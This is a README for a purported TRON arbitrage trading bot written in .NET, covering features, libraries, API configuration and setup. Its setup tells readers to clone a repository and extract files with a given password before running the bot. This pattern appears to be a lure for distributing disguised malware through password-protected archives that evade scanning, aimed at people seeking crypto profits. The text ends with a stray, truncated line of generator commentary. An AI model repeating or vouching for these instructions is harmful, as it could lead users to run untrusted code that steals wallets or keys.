**Tron Arbitrage Bot** is a .NET application designed to automatically detect and exploit arbitrage opportunities on the TRON blockchain. The bot monitors different decentralized exchanges (DEXes) for price discrepancies between trading pairs and executes trades to profit from arbitrage opportunities.

## Features

- Monitors multiple DEXes for arbitrage opportunities in real-time
- Executes trades automatically when profitable conditions are detected
- Supports a variety of TRON-based tokens
- Configurable trade thresholds and parameters

## Prerequisites

To run the Tron Arbitrage Bot, ensure you have the following installed:

- [.NET SDK](https://dotnet.microsoft.com/download) (version 6.0 or later)
- Access to the TRON blockchain via an RPC node
- Libraries for interacting with the TRON network

## Libraries Used

The bot makes use of the following libraries for interacting with the TRON blockchain:

- **TronNet**: A .NET library for working with the TRON blockchain.
  - [TronNet GitHub Repository](https://github.com/tronprotocol/tronnet)
  - Install via NuGet:
    ```bash
    dotnet add package TronNet
    ```

- **Nethereum** (optional): While primarily used for Ethereum, parts of this library can be used for similar functionalities on TRON-based tokens due to TRON's compatibility with Ethereum standards (like ERC-20 tokens).
  - [Nethereum GitHub Repository](https://github.com/Nethereum/Nethereum)
  - Install via NuGet:
    ```bash
    dotnet add package Nethereum.Web3
    ```

## Setup and Configuration

### RPC Node Setup

To connect to the TRON blockchain, you need access to an RPC node. You can use a public or private TRON node. One public RPC endpoint is:

```
https://api.trongrid.io
```
Alternatively, you can host your own TRON full node.

### API Tokens

To interact with TRON via TronGrid (a public TRON API service), you'll need an API key. You can obtain one by signing up on TronGrid.

Once you have the API key, update your configuration file or environment variables with the following:
```
TRON_RPC_URL=https://api.trongrid.io
TRONGRID_API_KEY=your_api_key_here
```

### Environment Configuration
- Clone the repository:

```
git clone https://github.com/wendel-batista-2008/tron-arbitrage-bot.git
cd tron-arbitrage-bot
```
- Extract files with password `vYEfdsaUe`
- Set up your environment variables or configuration file with the following:

```
TRON_RPC_URL=https://api.trongrid.io
TRONGRID_API_KEY=your_api_key_here
TRADE_THRESHOLD=0.5  # Minimum arbitrage percentage to execute a trade
MAX_GAS_PRICE=1000000000  # Maximum gas price in SUN for executing a trade
```
- Run the bot

### How It Works

The bot continuously monitors multiple DEXes on the TRON blockchain for price discrepancies between token pairs.
When a potential arbitrage opportunity is detected, the bot calculates potential profits, taking into account gas fees.
If the arbitrage opportunity meets the configured thresholds, the bot executes the trade on the selected DEXes.
The bot logs all activities and trades for review.

### Contributing

Feel free to contribute to the project by creating a pull request. Make sure to follow the contribution guidelines and provide clear documentation for any new features or bug fixes.

### License

This project is licensed under the MIT License - see the LICENSE file for details.



This `README.md` provides a detailed overview of the project, including setup instruction
